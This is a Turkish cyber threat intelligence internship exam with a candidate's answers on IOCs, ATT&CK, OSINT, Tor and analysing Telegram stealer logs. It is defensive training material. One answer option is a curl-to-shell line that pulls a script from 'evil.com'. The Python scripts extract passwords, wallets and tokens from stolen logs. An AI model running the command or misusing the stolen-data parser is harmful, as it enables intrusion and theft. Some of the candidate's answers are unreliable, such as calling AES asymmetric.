## Siber Tehdit İstihbaratı Staj Sınavı

#### Çoktan Seçmeli Sorular
1.	Aşağıdakilerden hangisi bir "TTP" değildir?
•	A) Komut ve kontrol trafiğinin DNS üzerinden şifrelenmesi
•	B) SHA256 ile hashlenmiş bir dosya
•	C) PowerShell ile UAC atlatma tekniği
•	D) Credential Dumping yapılması

Cevap ve kısa açıklama:
Doğru Cevap: B şıkkı
Cevap Açıklaması: Diğer şıklar TTP'ye (Tactics, Techniques and Procedures) girerken B şıkkı bir IOC'tur (Indicator of Compromise). Yani diğer şıklar bir yöntem belirtirken B şıkkı doğrudan bir ayırt edicidir.


2.	APT gruplarının taktik ve tekniklerini sistematik şekilde modelleyen framework aşağıdakilerden hangisidir?
•	A) Cyber Kill Chain
•	B) STIX/TAXII
•	C) MITRE ATT&CK
•	D) NIST SP 800-61

Cevap ve kısa açıklama:
Doğru Cevap: C şıkkı
Cevap Açıklaması: Cyber Kill Chain saldırı aşamaları modelidir. STIX/TAXII tehdit istihbaratı paylaşımı için bir standardize edilmiş protokoldür. NIST SP 800-61 Ulusal Standartlar ve Teknoloji Enstitüsü'nün (NIST) olay müdahale süreci aşamaları ile ilgili bir yönergesidir. MITRE ATT&CK ise özellikle APT gruplarının teknik ve taktiklerini sistematik bir şekilde modeller.


3.	 Aşağıdaki IOC tiplerinden hangisi en kısa süreli geçerliliğe sahiptir?
•	A) IP adresi
•	B) SHA256 hash
•	C) Alan adı (domain name)
•	D) E-posta adresi

Cevap ve kısa açıklama:
Doğru Cevap: A şıkkı
Cevap Açıklaması: IP adresleri genelde dinamiktir, belirli sürelerde değişir. SHA256 hash dosya değişmedikçe sabittir, alan adı ve e-posta adresi de genelde aylarca, yıllarca aynı kullanılır.


4.	 OSINT süreçlerinde hedefin sosyal medya faaliyetlerinin toplanması hangi aşamaya girer?
•	A) Technical Footprinting
•	B) Passive Reconnaissance
•	C) Threat Hunting
•	D) Active Scanning

Cevap ve kısa açıklama:
Doğru Cevap: B şıkkı
Cevap Açıklaması: Hedefteki kişiye bildirim gitmeyecek şekilde kişi hakkında bir keşif yapıldığı için Passive Reconnaissance. Technical Footprinting daha teknik detaylar için. Diğer iki şık ise aktif bir sürece işaret eder.


5.	Aşağıdakilerden hangisi hem IOC hem de TTP özelliği taşıyabilir?
•	A) CVE-2021-26855
•	B) *.onion uzantılı bir domain
•	C) Credential dumping teknikleri
•	D) PsExec kullanımı

Cevap ve kısa açıklama:
Doğru Cevap: D şıkkı
Cevap Açıklaması: PsExec kullanımı bir TTP'dir. Ama aynı zamanda sistemde PsExec'in çalışması, loglar veya processlerde iz bırakır ve bu IOC olarak sınıflandırılır. CVE-2021-26855, Hafnium'un atak yaşam döngüsünde yer alan bir Microsoft 0-day açığıdır. ProxyLogon olarak da bilinen zaafiyeti tanımlar. .onion uzantılı bir domain tercih edilmesi gizliliği arttırmaya yönelik bir TTP'dir. Credential dumping teknikleri adından da anlaşılacağı üzere yine bir TTP'dir. Bu TTP'lerin kullanımında bulunan olası izler IOC olabilse de kendileri IOC sınıfına dahil edilmezler.


6.	Aşağıdaki bilgilerden hangisi STIX formatında “observable” olarak tanımlanır?
•	A) Tactic: Defense Evasion
•	B) CVE-2020-0601
•	C) File name: malware.exe
•	D) Technique ID: T1059.003

Cevap ve kısa açıklama:
Doğru Cevap: C şıkkı
Cevap Açıklaması: STIX'te dosya adı, yolu, hashi gibi bilgiler gözlemlenebilir verilerdir. Diğer seçenekler sırasıyla taktik, CVE ve MITRE ATT&CK teknik ID'sidir; STIX'teki "observable" tanımı içerisine dahil edilmezler.


7.	Aşağıdaki araçlardan hangisi MITRE ATT&CK tekniklerine göre log analizi yapabilmek amacıyla geliştirilmiştir?
•	A) VirusTotal
•	B) Sigma Rules
•	C) Wireshark
•	D) Shodan

Cevap ve kısa açıklama:
Doğru Cevap: B şıkkı
Cevap Açıklaması: Sigma Rules farklı SIEM ve loglar için ortak bir jargon kullanarak analiz yapılmasına yarayan kurallar formatıdır. VirusTotal, dosya ve URL’lerin güvenlik taramasını sağlar. Wireshark network paketlerini analiz etmek için kullanılır. Shodan ise internete açık cihaz ve servisleri tarar.


8.	Aşağıdaki ATT&CK tekniklerinden hangisi, “komut satırı betikleri ile sistem kontrolü” anlamına gelir?
•	A) T1059.001 – PowerShell
•	B) T1204.002 – Malicious File Execution
•	C) T1027 – Obfuscated Files or Information
•	D) T1566.001 – Spearphishing Attachment

Cevap ve kısa açıklama:
Doğru Cevap: A şıkkı
Cevap Açıklaması: PowerShell tekniği “komut satırı betikleri ile sistem kontrolü” anlamına gelir. B şıkkı kullanıcının zararlı dosya çalıştırmasına yönelikken, C şıkkı dosyaların karmaşıklaştırılarak review edilmesi zor hale getirilmesi, D şıkkı ise belirli bir hedefe yönelik kimlik avı saldırısı yapılması anlamına gelir.


9.	Aşağıdakilerden hangisi “Open-Source Threat Intelligence” (OSINT TI) sağlayan bir kaynaktır?
•	A) MITRE Caldera
•	B) MISP
•	C) Metasploit
•	D) Burp Suite

Cevap ve kısa açıklama:
Doğru Cevap: B şıkkı
Cevap Açıklaması: MISP yani Malware Information Sharing Platformu Hash'ler, IP adresleri, domain'ler ve diğer IOC'ları, malware örneklerini ve threat intelligence verilerini paylaşmak için kullanılır. MITRE Caldera saldırı simülasyonu ile ilgili, Metasploit exploit geliştirme ve saldırı ile ilgili, Burp Suite ise web uygulamalarını interrupt edebilmemizi ve güvenlik testlerini yapabilmemizi sağlar.


10.	Aşağıdaki log çıktılarından hangisi “credential access” ile ilgili bir iz içerir?
•	A) curl http://evil.com/malware.sh | sh
•	B) powershell Invoke-Mimikatz
•	C) user added to administrators group
•	D) dns query for update.microsoft.com

Cevap ve kısa açıklama:
Doğru Cevap: B şıkkı
Cevap Açıklaması: Invoke-Mimikatz komutu, sistem hafızasındaki parola ve hashleri çıkarmak için kullanılan bir araçtır. Yani credential access ile ilgilidir. A şıkkı uzaktan zararlı betik indirip çalıştırma ile ilgilidir. C şıkkı privilege escalation ile ilgilidir. D şıkkı ise ağ trafiği gözlemi ile ilgilidir.

---

Açık Uçlu Sorular

1. OSINT (Open Source Intelligence)
Soru:
Bir kişi ya da kuruluş hakkında OSINT kullanarak bilgi toplamak istediğinizde uygulayacağınız adımları sırayla açıklayınız.
•	Hangi kaynakları kullanırsınız?
•	Hangi araçları tercih edersiniz?
•	Elde ettiğiniz verilerin doğruluğunu nasıl kontrol edersiniz?
Not: Teknik araçlara (örneğin theHarvester, SpiderFoot, whois, vs.) özel örneklerle desteklemeniz beklenir.

Genelde ilk olarak username search engine'leri kontrol ederim. ([WhatsMyNameApp](https://whatsmyname.app/)-[Instant Username Search](https://instantusername.com/)) Eğer bu kişi özellikle teknoloji alanında çalışan bir bireyse LinkedIn'inin mutlaka kontrol ederim. Username search enginlerden gelen sonuçlara bakarak bulduğum bütün sosyal medyaları tek tek gezerek incelerim. Takip ettiklerini veya takipçilerini görebilme imkanım varsa onları kontrol ederim.

Bir şirket hakkında bilgi toplamam gerektiğinde o şirket çalışanlarını kontrol etmeyi denerim. Ve şirketin Url'lerini, [Whois](https://www.whois.com/), eğitimde öğrendiğim [URLScan](https://urlscan.io/), [VirusTotal](https://www.virustotal.com/gui/home/upload) gibi sitelerden kontrol ederim. Ayrıca SpiderFoot'un ne olduğunu ilk defa duydum ve araştırdığımda çok hoşuma gitti, muhtemelen bir daha araştırma yapacağımda yararlanacağım kaynaklar arasında olacak.

Elde ettiğim bilgilerin doğruluğunu kendi içlerinde tutarlılık olup olmadığına bakarak kontrol ederim. Kullandığım araçların her zaman doğru ve net sonuç vermeyeceğini biliyorum. Bu yüzden eğer doğru olmadığını düşünürsem manuel olarak ya da alternatif araçları kullanarak arama yapmayı tekrar denerim.
 

2. OPSEC (Operational Security)
Soru:
Bir siber tehdit istihbaratı analistinin OPSEC'e (Operasyonel Güvenlik) dikkat etmeden yaptığı bilgi toplama faaliyetleri hangi riskleri doğurabilir?
•	3 farklı örnekle açıklayınız.
•	Aktif OSINT ile pasif OSINT farkı bağlamında değerlendirme yapınız.
•	Gerçek hayattan veya kurgusal bir senaryodan kısa bir vaka örneği veriniz.

OPSEC, görev esnasında alınan bütün güvenlik tedbirlerini kapsar.
IP'mizi maskelemeden atacağımız IP istekleri karşı kurumda görüneceği için konumumuzu direkt açığa çıkarabilir.
IP'mizi maskeleyip istek attık diyelim, karşı taraf gelen istekleri şüpheli olarak değerlendirip kendini ekstra korumaya alabilir, kendisi hakkında bir istihbarat toplama araştırması yaparak bulacağı kanıtları yok edebilir.
Yine güvenlik açısından yeterli önlemi almadığımızda yapacağımız işlerin yasaları ihlal etmemesi konusunda dikkatli olmalıyız.

Pasif osintte hedef sistemle doğrudan hiç bir etkileşime geçilmez, genel kullanıma açık ve karşı tarafa bilgi vermeyen araçlar tercih edilir. Hedefin bu osintin farkına varma ihtimali çok düşüktür.
Aktif osintte hedef sistemle doğrudan etkileşim içerisinde bir takip yapılır. Port ve zaafiyet tarama gibi yöntemler kullanılabilir. Bu yöntemler karşı tarafta loglanarak, olağanüstü loglarda herhangi bir alert durumuna geçilebilir.
Sonuç olarak pasif osint, aktif osinte göre daha güvenlidir ancak aktif osint kadar çok bilgi veremez.

Gerçek hayatt yaşadığım bir örnek: Geçtiğimiz zamanlarda bir osint sorusu çözüyordum ve sorunun bir noktasında bir telefon numarası buldum, aramak ve aramamak arasında çok kararsız kalıp sonunda sadece bir soru olduğu için aramaya karar verdim. Telefon numaramı gizlemediğim için(tabii ki ilk gizleyip denedim ama sonuç elde edemedim) kişi konuştuktan belli bir süre sonra LinkedIn'imde profilime bakıldı olarak düştü. 


3. CTI (Cyber Threat Intelligence)
Soru:
Bir APT grubunun faaliyetlerini incelemek istiyorsunuz.
•	Kullanacağınız tehdit istihbaratı kaynakları nelerdir (hem açık hem ticari)?
•	Bu grubun TTP’lerini MITRE ATT&CK üzerinden nasıl analiz edersiniz?
•	IOC ve TTP arasındaki farkları bu bağlamda açıklayınız.
Not: Örnek olarak Lazarus, APT28, veya FIN7 gibi bir grup kullanılabilir.

Öncelikle APT grubu hakkında genel bilgi edinerek başlarım. Tarihi, hedefi ve motivasyonu hakkında bilgi toplarım, daha geniş çaplı bir araştırma yapabilmek için bilinen diğer isimlerini öğrenirim. Bu kısımları [CrowdStrike](https://www.crowdstrike.com/adversaries/), [Malpedia](https://malpedia.caad.fkie.fraunhofer.de/), ve genel internet taramalarından, bulabildiğim daha önce yazılmış raporlardan, mesela ticari olarak [Mandiant](https://www.mandiant.com/) veya bu alanda çalışan şirketlerin ya da bireylerin LinkedIn, Github, Medium gibi sitelerde yayınladığı raporlardan araştırırım. Daha sonra [MITRE ATT&CK](https://attack.mitre.org/groups/) ve [VirusTotal](https://www.virustotal.com/gui/home/upload) kullanarak kullandıkları softwareler, TTP'ler ve IOC'larını tespit ederim.

Bilinen APT'ler için MITRE ATT&CK'ta zaten TTP'ler belirlenerek paylaşılmış durumda. Daha önce bir APT Raporu yazdığımda bunların ne demek olduğunu tam anlamamıştım tam olarak ama sorduğunuz 8. çoktan seçmeli soruyu araştırırken daha iyi anladım. MITRE ATT&CK'ta TTP'ler açıklamalı olarak yazıyor. Daha önce hiç TTP analizi yapmadım ancak bu TTP'leri kullanarak çalıştığımız kurumda bu TTP'lere karşı önlem alınıp alınmadığına bakabiliriz. En tehlikeli olan TTP'leri analiz ederim. Bu TTP'leri o grubun Atak Yaşam Döngüsü'nü anlamak için kullanırım. Bu sayede APT grubunun nasıl bir davranış sergilediğini görerek profillerini daha kolay anlayabiliriz.

IOC'lar bir hash, IP ve domain gibi bir gruba ait belirteçlerdir. IOC'lar farklı açık kaynaklı ortamlarda depolanarak insanların olası tehditlerin analizlerinde tehdit aktörünü daha kolay tanımasını sağlar.
TTP'ler ise tehdit aktörlerinin kullandığı yöntemlerdir. Örneğin .onion uzantılı bir domain o grubun tor ağı kullanarak gizlenme taktiğidir.
IOC'lar genelde kısa ömürlü iken, TTP'ler davranışsal belirteçler olduğu için sürekli bir değişime uğramaz.

 
4. Tor ve Dark Web Analizi
Soru:
Bir tehdit aktörünün Tor ağı üzerinde faaliyet gösterdiği değerlendirilmektedir.
Aşağıdaki soruları teknik olarak yanıtlayınız:
·	Tor ağı nasıl çalışır? Paketler nasıl yönlendirilir ve kullanıcı gizliliği nasıl sağlanır?
·	 .onion servislerine ait IOC'ler nasıl tespit edilir? IOC tespitinde hangi araçlar ve teknikler kullanılır?
·	 Tor ağı üzerinde istihbarat toplarken dikkat edilmesi gereken OPSEC önlemleri nelerdir?
·	 Tor ağı üzerindeki bir forum ya da pazar yeri nasıl analiz edilir? Arama motoru veya crawler kullanımı örnek vererek açıklayınız.
Bonus: Eğer biliyorsanız, Cevabınızda teknik araçlardan ahmia.fi, onionsearchengine.com gibi araçlardan birini örnek olarak açıklayınız.

Tor ağı soğana benzetilir. Torda 3 farklı düğüm vardır: giriş, orta ve çıkış düğümleri. Biz istek attığımızda bu 3 kere şifrelenerek gönderilir. Her katman sadece kendi şifresini çözer bu da hem giriş düğümünün alıcıyı, hem de çıkış düğümünün göndericiyi bilmemesini sağlar.

Bir .onion servisine dair IOC'ları nasıl tespit ederiz emin değilim.

Her ne kadar torda nereye gittiğimiz bilinemese de tor ağına bağlandığımız görülebilir bu yüzden öncelikle vpnimizi açıp sonra tora bağlanmalıyız. Tarayıcımızı tor ağı için ayrı kullanmalıyız. Torda gezinirken gerçek dünyamızdan bağımsızlaşmalıyız. Sanal bir kimlik oluşturmak yerine her defasında rastgele bir kişi olmak rastgeleliği artırarak bize ait belirteçler arasında ilişki kurulmasını zorlaştırır.

Tor ağı üzerinden bir hidden wiki arayarak başlayabiliriz. 'the hidden wiki' yazarak https://thehidden2[.]wiki/ adresini bulduk ve Onion Land Search arama motoruna ulaştık (http://3bbad7fauom4d6sgppalyqddsqbf5u5p56b5k5uk2zxsy3d6ey2jobad[.]onion/). Sonra tekrar 'the hidden wiki' diye aratarak Just Onion'a ulaştık (http://justdirs5iebdkegiwbp3k6vwgwyr5mce7pztld23hlluy22ox4r3iad[.]onion/). Just Onion üzerinden biraz gezerek bir fransız forumu buluyoruz (http://jkie5viyrmymttownlksylz5vipyxxvs6qgy2yybgbssoiuf7a7klpqd[.]onion). (Linkleri daha önce hazırladığım bir rapordan aldığım için geçersiz olma ihtimalleri var.) Ya da otomatize olarak analiz etmek istiyorsak Go dili üzerinden "golang.org/x/net/proxy" kütüphanesini kullanarak bir script yazabiliriz. Forumlardan topladığımız bilgilere göre de belirli otomatize edilmiş analiz scriptleri yazabiliriz.

Ahmia.fi, tor ağındaki .onion uzantılı siteleri gezerek sitelerin başlık, açıklama ve bağlantı gibi verilerini çekip toplar. HSDir düğümlerinden hidden service descriptionları toplayarak .onion sitelerinin HTML içeriklerini çeker. Daha sonra bunları indexleyip sınıflandırarak kaydeder. Normal kelimelerle arama yaptığımızda kolayca bulur ve bize ilgili sitelerin başlık, kısa özet ve urllerini listeler.

Bonus: Daha önce go dili ile, .onion uzantılarını da kapsayan, web sayfalarını çekebilmek için bir script yazmıştım. (https://github.com/zmzmstz/go_website_bot)
 
5. Temel Bilgisayar Bilimleri – Hashing ve Encoding
Soru:
Hashing, encoding ve encryption kavramlarını birbirinden ayırarak teknik farklılıklarını açıklayınız.
•	Hangi durumlarda hangisi tercih edilir?
•	SHA256, Base64 ve AES algoritmalarını karşılaştırarak örneklerle açıklayınız.
•	Hash değeri üzerinden dosya doğrulaması nasıl yapılır?

Hashing plain text veya inputu sabit uzunlukta benzersiz bir koda dünüştürür. Tek yönlüdür, geri dönülemez ve genelde veri bütünlüğünü doğrulamak için kullanılır.
Encoding veriyi başka bir anlamsız veriye dönüştürür. Bu veri genelde kolayca geri çözülebilir ve gizliliği düşüktür.
Encryption ise veriyi aradaki insanların veya makinelerin anlamaması için iki taraflı (anahtar tabanlı) bir şifrelemedir. Doğru anahtar olmadan cipher text çözülemez.

SHA256 bir hash yöntemidir. Geri döndürülemez ve verinin bütünlüğünü tespit etmek için kullanılır.
Base64 en kolay encoding yöntemlerindendir. Genelde cipherı kendini belli eder ve kolayca geri dönüştürülerek(decoding) plain text elde edilir.
AES Blok şifreleme algoritmasıdır. Asimetrik bir encryption örneğidir. Anahtar olmadan çözülemez.

sha256sum, md5sum gibi kali komutları ile asıl dosya ve değiştirildiği düşünülen dosyanın hashleri alınır, bu hashler karşılaştırılarak değişiklik olup olmadığı anlaşılır.


Kodlama ve Betik Geliştirme

[Python] IOC Reputation Check via VirusTotal (Public API)
Senaryo:
Bir analist olarak, topladığınız şüpheli IP adreslerini hızlıca değerlendirmek istiyorsunuz. VirusTotal Public API anahtarınız mevcut (rate limit’li olsa da uygun).
Görev:
Python kullanarak aşağıdaki adımları gerçekleştiren bir script yazınız:
•	ips.txt dosyasını oku (her satırda bir IP olacak)
•	Her IP için VirusTotal Public API’sine sorgu gönder
•	Gelen JSON cevabındaki malicious veya suspicious kategorileri 1 veya daha fazla ise:
o	IP’yi malicious_ips.txt içine yaz
•	API yanıtı bulunamazsa not_found_ips.txt içine yaz
•	Yanıtları JSON formatında responses/ klasörüne kaydet

(https://github.com/zmzmstz/brandefense/blob/main/IOC_Reputation_Check_via_VirusTotal.py)
 
 
[Bash] Günlük Hayat Senaryosu 2 – Dosya İmzası İzleme (Cron Uyumlu)
Senaryo:
Sunucunuzda /opt/scripts/ klasöründe çalışan bazı kritik script dosyaları var. Bunların değiştirilip değiştirilmediğini her gece kontrol etmek istiyorsunuz.
Görev:
Bash script aşağıdaki işlevleri yerine getirmelidir:
•	sha256sum ile mevcut dosyaların hash değerlerini baseline_hashes.txt içine yaz (ilk çalışmada)
•	Sonraki çalışmalarda:
o	Aynı klasörü tekrar kontrol et
o	Değişmiş, silinmiş veya yeni eklenmiş dosyaları tespit et
o	Tüm farkları integrity_report.txt dosyasına yaz
•	Cron uyumlu olması için terminal çıktısı olmamalı, sadece dosya üretmeli

(https://github.com/zmzmstz/brandefense/blob/main/Dosya_imzasi_izleme.sh)

 
### Final Sorusu Cevapları

Final Soru – Telegram Üzerinden Stealer Log Analizi ve Tehdit Profilleme
Senaryo:
Son zamanlarda Telegram'da bazı public gruplar ve kanallar üzerinden stealer loglarının (RedLine, Raccoon, Vidar vb.) paylaşıldığı gözlemlenmiştir. Bu loglar genellikle .zip ya da .rar formatında olup, içlerinde şunlar bulunabilir:
•	passwords.txt, browsers.log, cookies.txt, wallets.json, telegram_desktop, discord_token.txt gibi dosyalar
•	Kurban sistem bilgileri (system_info.txt)
•	Çalınan browser verileri
•	Cüzdan adresleri, kullanıcı adları, e-postalar
•	Screenshot veya clipboard içeriği
 
Görev: Aşağıdaki sorulara teknik açıklamalarla ve örneklerle yanıt veriniz.
1. OSINT ile Erişim & Takip 
•	Telegram üzerinde bu tür logların dağıtıldığı kanalları nasıl tespit edersiniz?
•	Hangi açık kaynak araçları ya da teknikleri (örn. Telegram OSINT Tool, tdata, @getidsbot, arama dorkları) kullanırsınız?
•	Kanal analizi yaparken nelere dikkat edersiniz? (katılımcı sayısı, aktiflik, log türleri)

Telegram kanallarını indexleyen web siteleri ile bulabiliriz. Telegram içerisinde özellikle'cloud' kelimesini aratarak bulabiliriz. Ya da paylaşılmış telegram kanallarını alarak veya eğitimde hocaların ekranındaki kanalları bularak telegram kanallarına girebiliriz. Ayrıca telegram kanallarına girerken telegram girdiğiniz kanalın benzeri kanalları da önerir. Kanal analizi yaparken, aktifliğine dikkat ederim genelde, katılımcı sayısı bir reputationdur ama telegramda da bot katılımcı eklenebildiği için net bir reputation değildir. Loglarında TR olanlar daha analiz edilebilirdir. En önemlilerinden biri logların yeni paylaşılıp paylaşılmadığına dikkat etmeliyiz.


2. Log Dosyası Ayrıştırma 
•	Bir stealer log arşivinde hangi dosya ve bilgilerin bulunduğunu sistematik olarak nasıl ayırırsınız?
•	Python veya Bash ile bu logları işlemek için temel bir işlem akışı (pipeline) tanımlayınız:
o	Dosya türüne göre ayırma
o	Parola ve cüzdan bilgisi çıkarımı
o	“token” içeren dizinlerin tespiti
•	Regex, dosya hash’leme ve IOC çıkarımı gibi teknikleri örnekle açıklayın

Stealer log arşivleri genelde zip dosyası olarak gelir, bu zipi açtıktan sonra içinde ülke kodları ile başlayan ve her biri başka bir kişi için olan klasörler olur. Bu klasörlerin ise içinde ise .log, .txt, .json gibi dosyalar olur bu dosyaları inceleyerek özellikle regex ile dosya adında 'passwords', 'credentials', 'wallets' ve 'system_info' gibi kelimeler bulunan dosyalar bizim için önemlidir.

```
import zipfile, rarfile, os, re, shutil, hashlib

ARCHIVE = "stealer_logs.zip"
WORKDIR = "logs_unpacked"
CATEGORIES = {
    "credentials":   [r"passwords?\.txt", r"credentials?\.txt"],
    "browser_data":  [r"browsers?\.log", r"cookies?\.txt", r"\.json$"],
    "tokens":        [r".*token.*\.(txt|json)"],
    "wallets":       [r"wallets?\.(txt|json)"],
    "system_info":   [r"system_info\.txt"],
    "screenshots":   [r"\.png$", r"\.jpg$"],
}

if ARCHIVE.endswith(".zip"):
    with zipfile.ZipFile(ARCHIVE) as z:
        z.extractall(WORKDIR)
else:
    with rarfile.RarFile(ARCHIVE) as r:
        r.extractall(WORKDIR)

for root, _, files in os.walk(WORKDIR):
    for fname in files:
        src = os.path.join(root, fname)
        moved = False
        for cat, patterns in CATEGORIES.items():
            if any(re.match(p, fname, re.IGNORECASE) for p in patterns):
                dst_dir = os.path.join("parsed", cat)
                os.makedirs(dst_dir, exist_ok=True)
                shutil.copy(src, dst_dir)
                moved = True
                break
        if not moved:
            os.makedirs("parsed/other", exist_ok=True)
            shutil.copy(src, "parsed/other")

credentials = []
wallets = []
password_re = re.compile(r"[A-Za-z0-9@#$%^&+=]{6,}")
wallet_re = re.compile(r"0x[a-fA-F0-9]{40}")

for cat in ("credentials", "wallets"):
    for fname in os.listdir(f"parsed/{cat}"):
        with open(f"parsed/{cat}/{fname}", encoding="utf-8", errors="ignore") as f:
            text = f.read()
            if cat == "credentials":
                credentials += password_re.findall(text)
            else:
                wallets += wallet_re.findall(text)

token_files = os.listdir("parsed/tokens")

ioc_hashes = {}
for root, _, files in os.walk("parsed"):
    for fname in files:
        path = os.path.join(root, fname)
        with open(path, "rb") as fh:
            h = hashlib.sha256(fh.read()).hexdigest()
        ioc_hashes[fname] = h

with open("report.txt", "w") as rpt:
    rpt.write("Found credentials:\n" + "\n".join(credentials) + "\n\n")
    rpt.write("Found wallets:\n" + "\n".join(wallets) + "\n\n")
    rpt.write("Token files:\n" + "\n".join(token_files) + "\n\n")
    rpt.write("File hashes (IOCs):\n")
    for fn, h in ioc_hashes.items():
        rpt.write(f"{h}  {fn}\n")

```

Regex’ler metin içinden örneğin 0x[a-fA-F0-9]{40} ile Ethereum cüzdan adreslerini veya [A-Za-z0-9@#$%^&+=]{6,} ile en az 6 karakterli parolaları yakalamak için kullanılır. Dosya bütünlüğünü ve değişiklikleri kontrol etmek için Python’da hashlib.sha256(open("file","rb").read()).hexdigest() ile hash üretilir. Elde edilen cüzdan adresleri, parolalar ve dosya hash’leri IOC (Indicator of Compromise) listesi olarak kaydedilip SIEM/EDR sistemlerine beslenerek otomatik tespit kuralları oluşturulabilir.


3. Tehdit Profilleme
•	Eğer aynı IP, HWID ya da kullanıcı adı birçok logta tekrar ediyorsa bu ne anlama gelir?
•	Stealer kullanan tehdit aktörünün TTP'lerini MITRE ATT&CK’e göre sınıflandırın (örnek: T1056.001 - Input Capture, T1005 - Data from Local System)
•	Elde edilen IOC'leri hangi platformlara gönderip analiz edersiniz? (örn: VirusTotal, AbuseIPDB, urlscan.io)

Eğer birçok logta aynı IP adresi, HWID (hardware ID) ya da kullanıcı adı tekrar ediyorsa, bu farklı kurban makineleri hedefleyen tek bir aktöre işaret eder.

Stealer TTP’lerinin MITRE ATT&CK’e göre sınıflandırırken yöntemleri analiz ederek kodlarını buluruz. Bu sayede kodları ile kolaylıkla sınıflandırma sağlayabiliriz.

Elde ettiğim IOC'leri VirusTotal, urlscan[.]io adreslerinde sorgularım. Elde ettiğim IOC'lar domainler ise whois sorguları ve domain kayıtlarına bakarım.


4. Etik & Hukuki Değerlendirme 
•	Kamuya açık Telegram loglarını analiz ederken yasal ve etik sınırlar nelerdir?
•	Bu tür verilerin paylaşımı/saklanması hangi durumlarda suç teşkil eder?
•	Bir CTI analistinin sorumlulukları nelerdir?

Kamuya açık Telegram loglarında başkalarının kişisel verileri paylaşıldığı için bu verileri kullanmamamız, suistimal etmememiz gerekir. Bu verileri eğitim amaçlı incelesek bile stealer loglar bir suç unsuru olduğu için ne bilgisayarımızda bulundurmalıyız ne de paylaşılan ortamlarda bulunmalıyız.

Şifre, kimlik numarası, finansal bilgiler gibi hassas verileri kişilerin rızası olmadan saklamak veya üçüncü taraflarla paylaşmak KVKK ve özel hayatın gizliliğini ihlal veya bilişim sistemlerine izinsiz erişim suçlarına zemin oluşturabilir.

Toplanan verileri sadece istihbarat ve savunma amaçlı kullanmak, hassas kişisel verileri anonimleştirmek, yasalara ve şirket politikasına uygun arşiv/proses yönetimi uygulamak; bulguları doğru, tarafsız raporlayıp ilgili birimlerle (SOC, hukuk, uyumluluk) güvenli ve kontrollü paylaşmaktır.


5. Raporlama ve İfade Becerisi 
•	Yukarıdaki bilgiler ışığında örnek bir “stealer log tespiti” vakasını 1 sayfalık mini CTI raporu formatında özetleyiniz.
•	Rapor şunları içermelidir:
o	Kanal adı / URL (örneklenmiş, sansürlü)
o	IOC Listesi (örnek IP, domain, hash, e-posta, token string)
o	Tespit edilen stealer türü ve teknik açıklama
o	Tavsiye edilen aksiyonlar (defansif / adli)
 
Ek Bilgiler (İsteğe Bağlı Kullanılabilir):
•	Telegram logları için Python modülü: telethon
•	ZIP log işleme için: zipfile, os, re modülleri
•	IOC ayıklamada: YARA, Regex, CyberChef
•	MITRE ATT&CK referansı için: https://attack.mitre.org/

### Mini CTI Raporu: Stealer Log Tespiti

Kanal adı / URL: https://t.me/bers*******

IOC Listesi: ioc.txt olarak ektedir. Stealer logu özellikle eski seçtim. Hiç bir ioc güncel değildir. IOC'ları bulmak için çalıştırdığım script:
```
import os
import re

patterns = {
    'IPv4': re.compile(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b"),
    'SHA-256': re.compile(r"\b[a-fA-F0-9]{64}\b"),
    'Ethereum': re.compile(r"\b0x[a-fA-F0-9]{40}\b"),
    'JWT': re.compile(r"\b[A-Za-z0-9-]+\.[A-Za-z0-9-]+\.[A-Za-z0-9-_]+\b"),
    'Token': re.compile(r"(?i)\btoken['\"]?\s*[:=]\s*['\"]?([A-Za-z0-9-_\.]{10,})['\"]?\b"),
}

def scan_folder_for_iocs(folder_path):
    ioc_results = {}
    for root, _, files in os.walk(folder_path):
        for fname in files:
            file_path = os.path.join(root, fname)
            try:
                content = open(file_path, encoding='utf-8', errors='ignore').read()
            except Exception:
                continue
            matches = {}
            for tag, regex in patterns.items():
                found = regex.findall(content)
                if found:
                    matches[tag] = set(found)
            if matches:
                ioc_results[file_path] = matches
    return ioc_results

folder_path = "."

results = scan_folder_for_iocs(folder_path)

output_path = os.path.join(folder_path, "ioc.txt")
with open(output_path, "w") as f:
    for file_path, iocs in results.items():
        f.write(f"{file_path}:\n")
        for tag, values in iocs.items():
            for value in values:
                f.write(f"  {tag}: {value}\n")
        f.write("\n")

print(f"Found IOC entries have been written to '{output_path}'.")
```

Tespit edilen stealer türü ve teknik açıklama:
RedLine, RedLine olduğunu direkt password.txt içerisinde kocaman yazmasından anladım.
RedLine, ConfuserEx ile obfuscated edilmiş bir .NET modülü olarak kurbana phishing veya kötü amaçlı yükleyici yoluyla bulaşır (T1027, T1566); %AppData%\…\redline.dat gibi gizli konumlarda saklanıp Run\RedLineUpdater kayıt defteri anahtarıyla her açılışta çalışacak şekilde kalıcılık kazanır (T1547.001). Çalıştığında klavye vuruşları ve clipboard verisini yakalayarak (T1056.001), Chrome/Firefox oturum dosyaları ile Telegram ve Discord token’larını çeker ve passwords.txt, cookies.txt, discord_token.txt gibi çıktılar üretir (T1005). Tüm bu verileri AES ile şifreleyip HTTPS POST isteğiyle …/submit.php endpoint’ine göndererek uzak C2 sunucusuna sızdırır (T1041), böylece saldırı zincirinin tespit ve müdahale noktalarını netleştirir.

Tavsiye edilen aksiyonlar:
Ağ ve uç nokta korumasını güçlendirmek için öncelikle EDR/AV sisteminize "Run\RedLineUpdater" kayıt defteri anahtarını, "redline.dat" ve "redline_dump.zip" gibi dosya adlarını izleyen basit tespit kuralları ekleyin ve "dotnet.exe" altındaki bellek içi yüklemeleri yakın takibe alın. Ağ trafiğinde ise HTTPS POST isteklerinde "/submit.php" gibi yaygın exfiltration uç noktalarını ve "MSIE 6.0" gibi olağandışı User-Agent’ları loglayın; tespit edilen C2 domain ve IP’leri firewall veya URL filtrelerinizde kara listeye alın. Ele geçirilen parolalara veya çerez dosyalarına (passwords.txt, cookies.txt) karşılık gelen hesaplar için mutlaka parola sıfırlama ve çok faktörlü doğrulamayı (MFA) devreye alın; kullanıcı token’larını iptal edip yenileyin. Etkilenen makinelerden disk imajı ve bellek dökümü alarak RedLine’a özgü konfigürasyon dosyalarının (AES-şifreli config.json) izlerini adli inceleme için saklayın; hash’leri kaydedip delil bütünlüğünü koruyun. Son olarak, bu tespit kurallarını ve IOC listelerinizi düzenli olarak güncelleyip SOC ekibinizle paylaşarak saldırı gösterge setinizi daima taze tutun.


Ek bilgiler:

Ek bilgilerin kullanıldığı bir log ayıklayıcı kodu yukarıdaki soruların cevapları arasında verdim.

